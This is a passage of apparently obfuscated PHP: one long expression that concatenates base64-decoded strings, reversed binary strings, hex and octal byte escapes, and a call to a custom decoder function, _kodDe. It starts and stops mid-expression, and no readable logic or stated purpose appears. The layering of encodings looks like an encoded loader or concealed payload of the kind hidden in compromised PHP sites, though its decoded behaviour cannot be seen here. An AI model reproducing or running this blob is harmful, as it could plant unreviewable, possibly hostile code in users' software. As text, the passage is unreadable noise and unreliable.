yrdYB/62r7I15n3UCrS+N5XA3OBqmxfqbUAyQNTclIhEzKMOqlwCI7IXWquZSVJg==').strrev('@˝ûŒIiNÈQbPcê2P›ÎçJkÓêˇ∂÷äÛ«S®Iπˆ‰óÄé·|ªG'."\n".'◊∏∑–W¬').base64_decode('QiGdhnkUj4S0bJ5yFytdyMaEoIuXQDgFGA7GU3S2lOgGCTW7SJapje2ULbpC08F/nAcm9KxCRQ==')."\x4b\x34\xeb\xd4\x4\x9e\x76\x18\x54\x67\x4b\xe9\x50\x15\xbe\x36\x59\x86\xa5\x43\xa8\x61\x43\xe9\x52\xad\xb4\x4e\xa8\x3f\xa5\xd2\x2a\x15\x58\xdd\x68\x2d\x13\x6a\x46\xa5\xbd\x94\x56\xe9\xa2\x0\xe4\xa5\x22\xeb\xbc\xbc\xa1"."\46\65\102\223\100\100\2\160\316\102\65\63\10\62\101\201\205\306\373\240\134\311\1\26\347\266\212\311\71\66\214\10\13\154\173\157\147\147\324\23\350\16\3\331\22\103\372\202\376\260\217\122\204\333\33"."\x75\x7b\x7a\xd8\x62\xc3\x87\x89\x20\xc0\xb9\x55\xce\x9b\x30\xa4\xd8\x28\x30\x6d\xce\xdd\x39\xbf\xa4\x4b\x12\xe4\x87\x38\xc\x18\x59\x5e\xcf\x99\xaa\x23\x4e\x4a\x4b\x70\xce\x89\x31\xe6\x96\xb0\xcd\xb2\x1c\x5c\xa2\x1d\x75"."\50\331\225\216\254\152\51\16\126\165\373\342\44\205\305\125\331\117\206\200\163\272\14\130\5\301\206\201\256\204\75\201\20\311\320\12\241\100\250\210\251\6\251\107\117\57\111\312\12\303\277\320\107\200\23".base64_decode('6cKmEAHE3ReiXKoA8A1tpcLb2ErrQ8oezWa4nBTVbOMX1WODgEMBolMqtdrBxyrc4e9eFO0KeA==').strrev('¥YK˝⁄˙	Íá∞íæΩ`ò™(RﬂtR˛ù‹K‡/h6¬∑Ñ_M◊èoxr·Å`7Qù}')."\335\357\353\364\206\242\36\267\247\203\343\164\273\273\110\44\232\204\273\30\323\145\307\217\2\156\36\142\173\241\150\21\356\353\150\147\106\155\33\217\50\25\251\243\234\116\300\312\243\22\332\44\315\205\273".base64_decode('SdQSItrG9QKlViZuZSmDyCpkhipFIhfX4J9ayR2SrHyUsYLYGAuiZtA4kK/I9yXCfMtqEIU4bQ==')."\152\122\67\324\37\3\270\223\26\43\214\222\70\230\67\74\15\214\200\33\155\133\1\45\240\21\211\322\271\150\2\61\337\115\253\223\344\133\306\150\0\354\255\335\160\303\31\355\13\6\272\27\222\14\43"."\151\225\126\300\117\272\277\206\112\42\144\337\151\161\226\4\304\10\205\113\204\264\323\7\165\332\225\253\361\317\261\370\7\110\136\344\343\152\216\366\172\14\62\146\306\70\350\126\2\314\26\312\124\365\2"."\373\132\114\327\63\164\36\203\265\226\361\13\266\143\35\64\51\221\214\122\346\64\215\256\132\144\161\10\7\26\371\272\243\224\262\160\114\240\106\14\0\173\300\100\220\164\210\245\17\321\175\10\116\14\372"."\102\224\13\30\352\160\101\243\335\345\162\116\43\124\254\202\365\207\174\336\265\42\62\62\255\246\337\61\315\71\0\2\265\165\13\160\224\304\42\116\133\164\12\311\137\60\130\156\50\202\324\230\255\265\315"."\21\127\304\125\323\332\334\357\166\254\124\34\53\353\35\163\34\3\323\42\316\332\151\4\60\260\252\121\156\132\3\21\0\142\353\344\1\360\323\22\151\235\32\161\34\173\302\361\13\372\43\3\325\315\323".base64_decode('jok4J0dGBupqW+l34gUD7LHiY6yqiWk1oEpANGEoOcQSBQSasFLLc+iqmWsoHIyhmuI5+h2RaQ==')."\x3\xad\x42\x3e\x1\x54\xfa\x2d\x20\xba\x0\xfe\x9c\x66\x78\x6e\xc7\x72\xd8\x32\x96\x15\xce\x7b\x42\x1f\x85\x5c\x9c\x73\x57\x38\x2f\x62\x4a\x9c\xf0\x1\x2d\x95\x63\x53\x8\x2c\xe8\x6c\x6f\x6b\x17\x79\x57\x4d\xc5\xbf\x6b"."\350\100\246\124\272\54\303\3\52\203\120\147\41\247\15\323\275\173\116\35\46\1\335\242\364\35\123\255\21\225\222\7\200\333\342\200\70\350\76\13\44\11\261\14\22\322\310\27\370\136\107\105\202\77\151".base64_decode('RT4Kxa4RFkuoOTJOEwi2GVfyakhoYTQadrd1+qKUwxBOTOOIK7ax0y7QNM5R2aaRi8NRsfPyCg==')."\x95\xa\xe0\xb6\x92\xad\xf4\xae\x9a\x48\xa4\xd0\xaf\x26\x6\xfa\x1\x41\x2a\x8e\xe4\xc0\xaa\xe9\x6b\x6a\xa9\x24\xeb\x8a\x80\xff\xd1\x8\xe6\x43\xe4\xcb\x79\x3e\xe\x26\x90\x99\xe2\x16\x5b\x38\xcb\xe\x8e\xa2\x8c\x93\xc1"."\52\260\135\277\156\260\365\22\302\271\364\151\351\226\222\141\150\60\55\14\41\224\153\320\65\227\154\216\361\100\164\162\146\2\127\131\341\130\15\161\272\156\166\146\44\34\344\260\263\0\73\114\26\242\370"."\xdf\x96\x2a\xca\x79\x73\x80\xb6\x3d\x7c\xdd\xf1\x7b\x1d\x64\x5c\xdc\x4b\x1d\x7e\x22\x93\xb3\x80\x46\xa5\x47\x5\xcc\x50\x8b\x42\x4d\xbd\x60\xc4\x55\x86\x63\x93\x1b\x2c\xc5\x0\xcb\x10\x17\xd6\xa0\x58\x25\x1c\x1\x82\x46"."\xc8\xf0\x2c\x40\x86\xcb\xa4\xc\x4\x38\x19\x9e\xc4\xc8\x5c\x8\x95\xf9\x96\x5e\x66\x22\xa5\x4c\x24\x4d\x99\x97\x4e\x82\x7e\xaf\xac\x99\x5e\x24\xf1\xca\xb4\xaa\x56\x1a\xee\x8b\x33\xca\x98\x8c\xab\xdd\xa9\x16\xd5\x8c\x4c"."\53\55\323\266\310\264\342\62\332\71\170\111\45\172\1\205\220\112\240\40\230\356\151\31\16\10\34\135\132\12\14\322\326\63\361\130\346\242\263\234\62\364\102\276\207\176\111\210\341\312\20\0\257\51\3".base64_decode('BHXdkulWhgW6GC+B1eGhJXycee3ZQkiagOOldcBQmN6uFMVxrTjGOTs98ANMfrzGBZ/SLUXpKQ==')."\15\357\104\136\211\260\222\12\11\237\7\273\170\372\155\14\16\252\361\261\70\337\223\170\205\115\216\75\306\306\31\321\132\45\202\251\74\316\214\32\46\116\230\100\211\226\323\12\41\21\33\101\215\113\270"."\274\125\201\74\137\37\340\264\17\201\35\244\60\261\51\50\300\371\110\201\254\147\212\31\247\222\307\10\275\46\120\51\114\250\66\155\264\255\134\30\345\223\216\266\114\202\5\310\2\207\205\43\340\340\303"."\x28\x44\xc9\x8f\xa6\x47\x71\x77\x46\xb3\x6c\x1f\xc0\xfa\xb7\x84\xcf\xc0\xee\xee\xd1\x72\x63\x5a\x4e\xdc\x69\x73\x28\xe7\x6c\x7c\xe0\x21\x9\xf3\x18\xee\xe3\xf1\xc2\x98\x6d\xf0\x9d\xbc\x4c\x76\xf8\x32\xd8\xe5\xd\x9\xc"."\x8d\xef\x48\x41\xed\x61\x56\xa1\xee\xa4\xa4\x92\x9a\xd3\x49\xe6\xb0\x47\xf9\x9c\xeb\x5\x9b\x9a\x28\xad\xd\x21\x56\x42\x9b\x69\xc5\xe0\xbd\x4c\xe7\x11\x24\x5e\xd6\x2a\x13\xa2\xf0\xa8\x80\x96\x54\x8a\x9c\xa9\xdb\xf2\x8"."\324\157\132\143\354\120\102\10\332\13\305\121\357\170\221\16\266\127\253\24\25\247\235\146\166\202\336\254\24\106\55\15\353\25\243\150\15\227\300\352\115\17\254\250\60\36\55\71\24\0\121\141\244\242\266"."\xf3\x3\x5c\xd\x37\x63\x6f\x40\xc\xc9\x80\x11\x30\x9c\x70\x92\x2c\x84\xcc\x4b\x5c\x60\xf8\xe2\x3\x19\x26\xe\xb\x48\xf9\x52\x3e\x67\xe3\xc7\x95\xd6\xb4\x52\x8e\x5c\x2\x2d\x89\xf2\x8f\xda\xd8\x4d\xd9\xa\x44\x44\x10"."\42\71\326\227\264\314\2\33\211\230\142\70\15\120\32\377\10\147\331\104\74\50\60\300\100\51\206\71\146\132\152\266\123\247\122\47\244\135\137\102\263\40\4\162\42\235\36\17\161\104\201\15\63\230\120"."\x20\x6a\x8e\xb3\xac\xff\x32\xda\x10\xc9\x25\x4f\xb5\x61\x56\x62\xbe\xce\x3a\xc4\x2f\x9d\x7c\x6d\x10\x57\x16\xf1\x1a\x6\xa2\xf1\x96\xc3\x6b\x1d\x1c\x12\xae\x32\xb3\xec\x9e\x7\x1\x9d\xa6\xa5\xe7\x79\x8a\x10\xc5\xc9\x42"."\x12\x2f\x54\xc0\x62\x9d\x8f\x6a\x8\xb8\x77\x2\xad\xdf\xbc\xb\x11\x2e\xc9\x8b\x64\x55\x4c\x98\xce\xc\xc0\x70\x8a\x6c\xc4\x6d\x18\x74\x80\x71\xf3\xe0\x59\x9\x0\x8a\x20\x38\xd5\x42\xf4\xac\xae\x12\x37\xc5\x85\xfb\x8a"."\xfc\x8a\x12\x17\x5\x3f\xec\xc4\x8b\x8b\x53\x49\x24\x2\xf4\x20\x4b\xc\x97\xa3\x8a\xfb\xf6\xca\x5\xa1\x5b\x63\x56\x94\x10\xab\x8c\xe\x76\xec\xfc\xe2\xa9\x34\x3e\x6e\x16\x3c\xcf\xc4\x4c\x22\x64\xdc\x6c\xed\x48\x36\xa5"."\x7\xfc\x95\x60\x4c\xe6\x6a\x2f\xa1\x21\xbe\xd8\xf1\x8b\xbd\x52\x49\xd4\xce\x38\xfe\x9d\xb8\x54\x36\x3\xf8\x80\x56\x8e\x43\xde\x96\xd6\x72\xaa\xc9\x56\x15\xc3\xac\xc4\x23\xfe\x9d\x48\x62\x93\x4a\xed\x42\x88\x28\x7d\x90"."\245\214\67\127\354\126\110\376\343\321\2\114\23\216\157\300\56\7\0\304\65\200\235\121\160\276\43\54\163\150\311\210\132\266\45\73\210\312\20\346\203\155\210\301\374\303\55\152\67\364\254\77\0\346\127".strrev('¸ﬁØ2Äb‰#c•ÆZO]Øõ©–·w˝«x‹‹æ(¨…§ ÒêWDf$”l£jb'."\r".')ÈS≈+¢e').base64_decode('W6axc9rSrP7eo/t9/9wXJ0bOm/vwcPySFdcfPHPruwn/3epTGx1PPPDUNXNifqdv+ZRNVZs2bg==')."\333\261\350\271\231\133\126\167\154\270\262\366\271\3\35\177\271\174\217\345\227\167\71\27\234\362\223\256\347\116\14\135\166\311\211\317\137\123\54\372\77\174\346\203\207\146\377\355\231\7\236\176\146\336\337".strrev('∂æÌ‹˛^Ogkoë¯ˇΩ7∆ßGˆd;⁄_Gé„gﬁÒ\\W˜«πÏﬂâ÷ˆæo˜÷ÒúgÚÛßÛxˇ')."\xa5\x99\xce\xc9\x77\x2e\xe9\x5b\xfc\xc6\x8d\x27\x4f\xb9\xf2\x98\xa9\xce\xb\xdf\x39\xf7\xcb\xc5\x3f\x9b\x14\xbb\xec\x9e\xdd\x67\x1d\x35\x77\xcb\xdd\x47\xbc\xfb\xc3\xd1\xea\xb1\x17\xef\xf7\x7c\xe3\xb9\x1f\xd\xe\x9f\xea"."\171\372\314\65\247\74\125\234\160\141\307\37\36\213\17\57\357\336\162\255\373\310\167\357\171\145\360\20\357\317\17\72\140\237\375\277\71\260\351\354\332\11\247\35\265\254\360\207\257\252\117\131\161\172\113"."\xdb\x8b\x87\xdf\x77\xc8\xda\x2b\x97\xa6\x6\x96\x1e\xb6\x36\x7d\x85\xef\x96\xf8\xdb\x37\x3f\xf8\xf0\x3b\x87\x5c\x77\xf8\x86\xa5\x1f\xbe\x3d\x7a\xe8\xac\x49\xcd\x8f\x55\x5f\xf2\x4e\xc7\xdc\x43\xad\x2d\x6f\xdf\xf2\xde\x45"."\243\53\366\372\370\355\133\346\365\135\372\207\303\224\5\125\365\352\351\217\155\376\345\365\312\320\347\267\214\274\45\347\156\114\377\375\312\55\137\275\177\335\310\135\367\314\74\176\337\177\215\276\170\141\266"."\367\311\346\33\157\70\376\331\307\57\174\354\40\117\337\331\233\27\157\337\377\200\376\365\373\76\171\344\77\136\273\277\341\210\223\264\176\355\252\327\132\267\375\365\222\25\47\336\364\352\213\167\134\171\161"."\366\272\373\132\246\335\60\343\17\67\177\270\327\63\247\277\161\371\325\227\37\367\174\360\355\253\317\370\153\44\174\334\312\55\327\276\137\367\366\203\237\176\173\146\157\357\115\33\237\173\351\301\257\177\137"."\x73\xf0\x4b\x57\xde\xf8\x8b\x5b\xbe\x38\x74\x86\xbc\xf5\xa4\x8f\xee\x5d\xf2\xee\x79\x17\x7e\xf0\xca\xd4\x6b\x96\xde\x65\x4d\x3a\xef\x27\xb\x4e\x33\xf7\x7c\x76\xe2\x94\x8e\xfc\x7e\xdb\x6f\x6b\x7c\xb8\xa9\x71\xd3\x63\x4d"."\203\27\176\345\124\106\217\170\164\355\111\223\353\213\115\373\376\143\363\65\113\223\127\135\221\334\20\171\373\262\113\17\170\76\373\330\5\363\347\127\37\274\242\353\326\367\137\72\363\57\157\237\367\305\206".strrev('8OW·¸|ø=ıói7ßﬂ≠ÃÍ≥§sˇÆˆ¯>V‰{ÉuÖı{ˇÀﬁ·[u]èá¯Îè[{>~≥').base64_decode('fOFtZ51z+6t33N6g+X9z6OL0kadNeuGnH+93ec3mDc8d8Yiz87Pbjv77xu31bxfe+dOhpyz9xQ==')."\xa3\xf7\x2e\x4c\x5c\x3d\x71\xbf\xb9\xc3\x6d\xfe\x73\xb7\x9f\x7d\xcb\x86\x8f\xee\x3e\xf5\xa0\xb1\x91\x4d\x2b\xf3\x73\xd7\x1e\x9f\x9c\xfd\xe6\xa3\x47\x19\xaf\x3f\x5f\xf5\xb3\xc5\x89\x95\xeb\x5b\xef\xb8\xfd\xde\x37\xfe\xf7"."\xb4\x9e\x7a\xe9\xd4\x6b\xf\xbe\xf6\x98\x47\xbf\x5b\xf0\x48\xe2\x17\xd7\x6f\xfd\xe8\x7f\xaf\x7d\xff\x9b\xd1\xe2\xef\x57\x6f\xe9\x8a\x84\x46\xf7\xf0\x3e\x2d\x75\x28\x9b\xb7\xf4\xc\x3e\x17\xde\xc7\x19\x3f\xff\xf1\xc1\x1f"."\x16\x1c\x56\x77\xc7\xe2\xd3\x57\xad\x6f\x1d\xdb\xf6\x93\x93\x93\xab\x9f\x3a\xf4\xe1\x9a\x6b\xff\xf4\xd9\x63\x9e\x4f\xd7\x9f\x16\x9b\xb5\x73\xc1\x9b\x3f\xcd\xef\xd8\xe8\x3d\xf9\xa2\x8b\xaf\x39\x6f\x72\xe3\x43\xdf\xdf\xf8"._kodDe('MZPlmyhb5onBw93jf2wqYGzQwJmc2Kl+ZAw8j6nepYiOShTQJ+h5p0smrqjmBLbi2r/R86yMO50=').strrev('≈Á˘æk}g]è≠ﬁ#ûº›º«sº_\\ÕÁÕû˙˘è”„Ô|wwáëëÒøæ«Z/I˙˘?«S˚')."\247\16\235\271\166\215\347\321\237\314\335\374\364\207\137\377\374\11\207\377\230\347\376\370\304\310\342\104\153\165\107\317\36\247\267\77\160\103\303\346\344\337\316\377\351\256\167\234\267\367\33\265\15\223\256".base64_decode('Slx+5ps/O37W1Bql33HRjAOOXHbCoXOOemZC05NTDtvj6Utqzti35741z7X8afPWFT+c9PJfzQ==')."\x57\x4f\x79\x66\xe3\xcc\xf7\xbf\x5c\x78\xd3\x23\xef\x57\x5d\x91\xa9\xfa\x68\xce\xa5\x93\x5f\x39\xc6\xfa\x78\xf3\x2d\xb3\x3e\xbc\xef\x86\xeb\xe\x78\x45\x3d\xe6\x56\x9f\xab\xe3\xa6\xa7\x4e\xfd\xeb\x53\x87\xac\xdb\x7e\xb1"."\367\245\15\247\137\171\365\362\313\77\237\371\356\223\133\136\373\364\53\317\11\213\177\166\241\371\333\207\366\367\137\265\174\367\111\27\373\62\313\136\276\150\122\115\363\205\173\377\172\336\71\377\332\343\224"."\237\354\275\104\176\345\67\347\156\113\267\376\376\214\133\103\233\77\336\170\330\13\117\376\143\355\151\327\136\374\335\353\77\333\273\160\346\331\27\375\374\247\176\337\157\356\272\127\371\323\261\107\165\37\362".base64_decode('j7XKvqHfnHPwhM1XffK/5+3/rvnw9yP73qU/sOTdWWs/znRve/Sptdrp1zzx7RNN9Y47b6zKnA==').base64_decode('6VBPfTVx7dRLj9sz9079lHcW3bbm473O2+vkf8y8+cX3Ursdd9xpdxwxZ/u573z33Qn9c/86aQ==').base64_decode('7R3f73X7aZ5d73/j+fc7DrfunnvKM7s03bbhk7MmvdZyxPqlF6d//caOd5Tr9uw4//lP9l/yyw==')."\xa3\x2e\xf7\x9f\x79\xeb\xa6\x73\xb\x3f\x5c\x70\xdc\xab\x79\xff\xa4\x41\x7d\xde\x3\x77\xea\x57\xde\x3d\x96\xc\x6c\x3c\xe5\xcc\x77\xdb\x2e\xb8\xd1\xb5\xfa\xa9\xeb\xff\xfc\xe1\xc6\xe0\x7e\xdf\x7c\x36\xed\xb3\x46\xdd\x31"."\147\347\121\317\236\274\165\333\345\167\245\215\163\236\355\237\276\237\357\313\306\346\43\366\173\350\345\344\151\107\206\27\337\374\332\310\350\17\337\117\133\273\254\166\332\113\377\274\153\335\153\103\367\154\371"."\70\266\377\63\117\135\263\171\371\120\315\234\113\207\356\34\230\176\105\374\335\77\165\165\137\355\70\343\350\377\331\160\300\145\337\175\370\304\235\255\337\177\373\365\235\277\133\321\272\146\347\207\317\176\262"."\372\233\347\37\373\163\340\262\7\212\337\375\343\246\247\2\337\17\177\365\267\307\236\235\377\335\123\57\125\137\66\360\335\367\7\117\373\373\203\133\364\317\315\267\276\276\375\250\67\277\233\220\131\267\351"."\xf5\xb\xee\x6b\x49\x1d\xe0\xfc\xf0\xc8\xbf\x6d\x3b\x77\xc2\x81\x8b\x3f\x6d\x50\x3f\xab\xff\x60\xca\xa7\x27\x35\x3e\x72\xe8\x9e\xf7\xa6\x97\x84\x3d\x4f\x9f\xff\x40\x72\xca\x1f\xf6\x7d\xfd\xe9\xeb\x76\x3e\x7e\xd0\x69\x27"."\327\54\74\357\274\135\245\103\176\57\335\165\341\241\11\127\363\210\353\300\336\276\13\16\273\357\325\65\367\235\165\266\377\367\247\15\75\265\373\153\67\274\265\304\112\155\137\333\325\266\163\267\235\165\213"."\xe\xe9\x7a\xe2\xc0\x9f\x8c\x7d\xfc\xf0\x5\xaf\xdf\x7c\xee\x6b\x9f\x6d\xf3\x26\xda\xfd\x57\x69\xff\xfc\xfd\x9b\x7b\x1f\x12\x7c\x6b\xcd\x8b\x9b\x1f\xd8\xf2\xd5\x87\x7f\x79\xf4\xbd\x75\x73\x3f\xda\xbc\x7c\x5b\xf0\xa6\x2b".base64_decode('f3X0rdmbP/kku+9rN6qXXrLzyzPv77hz8fJNv2n4H+/ZU6933Hzsty9M3PT58pP3z5588B/3uA==')."\xfd\x37\x71\x6f\x48\xbe\x76\x9e\x6f\xc2\xf0\x55\x2f\xbf\x90\x7b\xfb\xc2\x5f\x1c\xb3\x58\xa\x7\x17\x2d\xff\xcb\x81\x2f\x66\x8e\x31\x6a\xa7\x1d\xb1\xf7\x53\xc6\xed\xf\x7e\xfe\xe1\x59\x8b\xbd\xef\xd7\xff\xcf\x6e\xfb\xbf"."\xf0\x6d\x76\x78\xe2\xb4\x7\xd6\xfd\xb2\xe5\x92\xe1\xcb\x5e\x4f\x3d\x71\x6a\xfe\xef\x99\xcf\x3e\xfc\xd7\xab\xaf\xc\x5f\x79\xcb\xa6\xdc\x8a\xba\x3b\x4e\xfc\x61\xe1\xba\x87\x67\xcf\x49\xcd\x68\xd8\x79\x66\xdb\x3e\x77\x87"."\76\364\305\237\377\342\332\353\122\357\334\37\76\342\213\330\232\344\251\373\136\164\311\302\327\276\276\364\276\63\166\36\274\357\332\317\206\77\32\135\361\352\207\237\14\374\351\240\300\145\63\333\267\236\360".strrev('yLÂ∏9ﬁ∂s¬ˆ|Úµ.áˇOw+ÆÓ∫Õg›Î˘.=ÍÍwP¯ævOÀ~vä€ı˜⁄∂˝…oË—')."\xed\x44\xa7\x76\xff\x1d\xb7\x3f\x70\xed\xdd\xf7\x4c\xbd\xbb\xfe\xf3\xdf\x4c\xf9\xe1\x9d\x39\x2f\x4d\x7a\xf9\x80\x13\xee\xa8\xdd\xe3\xdc\xdb\xbe\x4d\x9c\x35\xf1\xdc\x23\x37\x7d\x7d\xe6\xd6\x5f\xee\xfa\x8b\xf5\x67\x9d\xff"."\341\171\372\266\320\275\277\136\267\101\176\255\177\165\142\172\355\23\47\130\147\155\150\75\153\267\137\55\335\361\267\103\233\27\156\330\257\371\244\127\344\57\66\365\156\377\372\246\326\367\166\233\335\120\373".strrev('Voylóµ—±ì§◊7w¨Ωûﬂ{Ÿﬁÿë‹è¡»»˚˛˙xm◊ÜøÊ˜x#Ö+„yﬁ÷OSÛè')."\334\135\175\354\264\37\136\170\163\150\231\367\203\263\345\103\32\357\374\331\12\267\357\363\335\16\237\363\247\77\270\226\156\174\277\163\273\353\240\35\211\233\67\35\366\270\374\363\303\247\156\250\135\372\364"."\53\373\154\174\366\201\277\275\262\351\223\310\274\203\147\34\331\175\302\117\46\372\266\14\164\324\234\333\62\263\341\351\113\326\256\336\346\254\252\256\253\77\372\233\35\165\362\76\313\136\164\356\75\363\136"."\357\216\302\245\57\337\340\170\144\366\176\37\73\16\271\102\276\322\235\327\326\137\347\73\64\367\362\77\7\137\273\376\253\77\311\177\53\244\364\217\17\164\255\277\341\353\232\365\347\74\376\301\7\57\377".strrev('ôÎ˙€ø#©-ˇh˘wΩ˜˙Y?˜Í∆¸0|ßô√˚OèπÈ¢ˇæKÈ˙oæmÁüœw‹\'u–w«¨]k')."\57\317\72\252\165\355\224\213\336\355\175\61\376\330\214\273\264\263\37\376\303\304\25\127\75\176\101\323\73\113\367\166\74\170\350\215\77\77\271\363\351\327\16\34\176\366\167\75\153\372\56\137\365\110\153".base64_decode('7/ttv7nAe6K09orWP+761dKbdzvxaI/PimyI7L7bHg/01GzaPvbp3MeGB2752aoZV9fFbqlrWQ==')."\362\307\3\266\337\361\344\246\233\323\163\136\171\372\162\357\266\311\263\326\370\275\223\142\127\166\74\360\365\373\237\74\173\351\352\177\176\174\317\145\321\23\277\172\352\251\57\37\170\340\333\147\165\347\133"."\x3f\xbc\xfd\xe1\x77\xd5\xcf\x7e\xff\xe9\xb3\x7a\xeb\xf7\x9f\x7e\xfe\xc4\x26\x7f\x76\xf8\xbb\x67\x16\xf6\xfd\xf0\xf5\xb1\x5f\x7d\xb3\x23\xd0\x77\xd9\x1a\xe3\x9f\xef\xfc\x76\xd3\xef\xbe\x7f\x63\xfb\x9e\x9f\xc\xac\xf9\xee".base64_decode('no9c87/75HetO1/66YGHHvXSeb88+JP7nxn8za5XneNzT7mw/8vc1kmXJs+57fVV72z/82lv3g==').base64_decode('8sfM079e8ts7t9752huvfXLkEV+cs37Ph59/4oNTfqnPa7tPiQ1l5qYO+PPf/fX7TD7ssmd3nA==')."\x75\x56\xec\x86\xc8\xe2\x1b\xef\x5a\xe9\x79\xe3\xfe\x2f\x3d\xb7\x1d\xf6\xaf\x23\xd3\x87\xdf\x71\x6d\xf8\xfc\xcf\xae\xfb\xb6\x36\xf0\x40\xdf\xb2\xcf\x36\xac\x99\xe7\x7c\xe9\xe9\x97\xd3\x9f\x9e\xf0\xf4\x99\xaf\x4f\x4f\xbc"."\374\122\320\337\67\111\272\165\302\157\47\170\257\371\327\275\247\166\276\162\312\245\133\273\132\236\230\220\67\277\360\356\172\332\265\125\361\17\326\367\174\376\340\136\7\237\34\271\63\371\336\304\157\367\75".base64_decode('Rp2xffHPqQqxmTTGRhVyftVEpOaUlR4rkh1jLj0aHykS8XN2/RwcSOixXHqEbB7I7fxQeiQ2TA==').base64_decode('FVfUxNiQXlhJsI2spqTJzY6STcdHVhIp3LAKyZE0OVCZPpPoG5CfOTNIyXNmk8/OaZhFapXIpA==').strrev('Vc√C£ CüLoìg≥ƒ»õ0÷>D›ûäNüN1úûJcS4ê$ı,íg”MYIÜ•1\\Œ%™Ÿ8¥')."\x92\x14\x3c\x38\x36\x64\x64\xe9\xd1\x54\x61\x48\xcd\xc\x53\x65\xb0\x41\x75\xc8\x30\xe3\xa4\x95\xd9\xc4\x98\x56\xcc\x93\xc8\x68\x2e\xaf\xd\xd2\x7b\xeb\x41\x2d\x1b\x1b\xa3\xd7\x57\x8d\xb3\x48\xed\x1a\x66\x90\x7a\x34\x36"."\220\233\252\71\244\315\215\63\311\260\214\152\211\314\220\111\167\160\111\65\156\16\321\223\33\275\220\31\245\333\231\142\134\31\52\320\56\155\152\44\245\315\232\111\172\51\236\54\52\5\235\352\132\47\322"."\53\107\122\244\56\63\353\11\112\103\23\251\224\125\110\344\263\151\162\147\147\16\245\206\325\21\162\272\67\275\201\124\252\241\201\144\32\316\247\225\324\30\31\375\206\71\344\263\272\221\65\13\203\144\234".base64_decode('5kwnmXJmMjOkq3QEyNeyg7G4QTd8c2bV0y+RkWqsJ2WuHLNyiknOKNWx7LCSI4Q4kxbVMIeM4Q==')."\260\226\30\262\204\333\363\221\225\312\40\241\74\155\64\65\226\31\246\65\43\145\317\230\115\2\215\115\224\344\32\311\300\314\244\103\145\44\213\43\243\61\322\151\206\231\316\217\214\145\51\125\321\61\233"."\115\52\135\34\66\223\243\364\74\125\131\71\226\32\54\122\45\47\63\71\26\33\35\246\304\107\107\277\161\72\335\255\31\203\131\172\250\240\16\255\54\214\130\344\213\272\232\210\347\24\62\263\32\151\227"."\352\261\202\221\241\147\61\215\115\263\350\54\40\275\330\120\117\2\263\352\111\222\62\26\37\316\253\244\230\225\311\270\221\240\212\275\63\51\51\16\45\126\216\305\350\216\177\46\235\37\203\246\32\63\342"."\244\25\331\130\106\125\22\144\62\27\215\101\155\70\107\25\326\142\271\321\170\172\210\216\7\371\174\332\310\26\363\364\60\152\372\154\122\371\131\164\242\317\234\101\272\177\366\34\122\207\270\226\57\306\12".strrev('%§ÉÜ»¿ÜF®ƒ≈”+«“t„_m”PRåút±ÛGÜ* &®§>ù°©≥‘ü=ßà “«§')."\x33\x29\xd1\x35\xcc\x21\xe5\xce\xa0\xc\x63\xe\xed\xdb\xa1\xd1\xdc\xa0\x96\xa4\x1a\xd2\x8c\x75\x11\xfc\x91\xe1\xb8\x6e\x19\xb4\xf9\x8d\x24\x33\xe0\x89\xf9\x58\x81\xf0\x8b\xa6\x7a\xca\x83\xe8\x98\x2c\xcb\x92\x6e\x6d\x53"."\xe2\x43\xf4\xb4\x17\xec\xfe\xad\x82\x59\x82\x40\xf5\xcf\xe3\xa2\xd2\xe2\x90\xaa\x52\xed\x3c\xaa\xff\xc7\xef\x65\xcd\x2\x52\x95\xa5\xe9\xfc\xac\x0\x1e\xb2\x8\xf7\xb7\x30\x1a\x12\x71\xe3\x39\x4b\x48\x6\x31\x5b\x2a\xd4"."\227\203\107\32\74\106\317\315\103\226\156\260\33\155\254\100\342\204\65\164\332\33\104\73\201\140\44\142\266\164\6\245\7\41\245\51\311\122\170\14\165\235\223\366\100\114\350\111\45\221\325\162\116\300\16".base64_decode('hpwi2CGmajlQWCbjtFut8Mrxe8DsmDmcKUvmPYU/ES1rndh7hDFK7D6M3OrQCD/fo9pR+Od4mQ==')."\332\251\324\112\110\103\54\44\21\145\71\231\374\356\203\177\42\144\121\210\220\111\123\55\23\335\155\157\233\140\200\223\117\220\61\153\146\211\336\20\321\336\41\35\342\202\35\102\325\113\52\215\115\131\313"."\141\143\171\133\152\140\220\324\36\133\225\70\313\273\17\17\262\330\101\266\257\243\36\347\331\122\126\171\67\221\117\363\357\222\133\6\16\20\351\306\116\332\66\212\262\117\12\162\36\211\114\133\144\11\177"."\120\226\320\235\235\144\67\266\360\173\371\140\212\104\146\250\371\214\22\147\225\312\217\111\111\5\240\47\232\245\44\230\75\22\325\13\226\54\235\206\305\352\210\27\206\45\15\260\315\306\322\46\330\22\101"."\117\26\230\171\2\273\361\20\17\107\321\275\51\357\114\34\145\67\52\41\120\22\273\357\65\324\204\106\227\125\65\213\60\251\42\50\272\61\141\332\160\161\260\100\30\266\333\232\171\255\371\164\36\332\253"."\x59\x73\x5b\x89\xcd\x4c\x54\xf8\x20\x9\x73\x55\x63\x11\x9a\x29\xbd\xfa\xa1\xf3\xd4\x69\x23\x68\x88\x26\xe4\x90\x54\xc3\xd0\x8d\xb9\x90\x3b\xb5\x70\x28\xe\x15\x72\x30\x1c\x2c\xe4\x60\x2a\xa1\x7f\x97\x90\xdf\xc9\x51\x47"."\210\236\133\222\124\254\313\336\160\120\141\7\353\13\320\76\300\230\23\46\262\315\43\124\174\14\31\7\301\66\46\310\273\21\146\107\275\372\43\131\55\261\351\171\300\374\163\114\261\307\314\50\364\52\311"."\4\53\202\226\123\331\0\24\114\166\40\336\346\16\371\75\321\36\67\125\114\125\362\171\27\124\371\202\232\263\274\307\41\375\160\262\216\52\111\142\43\340\47\203\17\25\346\242\361\214\156\12\204\37\115"."\xa9\x56\x94\x2c\x47\x74\xe5\x48\xab\xa0\x1b\x95\x98\x6e\x58\x2\x71\x44\x13\x1a\xa9\x4c\xa7\x1f\xf0\x19\x7f\x50\x28\x23\x5f\x28\x2b\x43\x30\x65\xc4\x15\x61\xc3\xc6\xee\x6f\x9b\x5\x56\xc\xf5\xd9\xf9\x65\x25\x8c\x71\xbd"."\166\170\344\57\136\144\232\346\210\156\220\212\101\203\63\250\242\30\222\70\203\364\164\270\203\114\15\161\206\263\336\331\300\161\301\7\243\120\33\263\205\32\303\204\302\356\140\5\343\103\154\224\110\6\233"."\30\42\222\14\35\201\76\311\23\350\354\355\352\16\141\153\73\14\357\16\10\351\110\331\314\226\54\202\111\261\276\236\116\267\307\47\371\273\303\1\252\105\312\224\151\311\352\140\137\76\362\320\4\210\31"."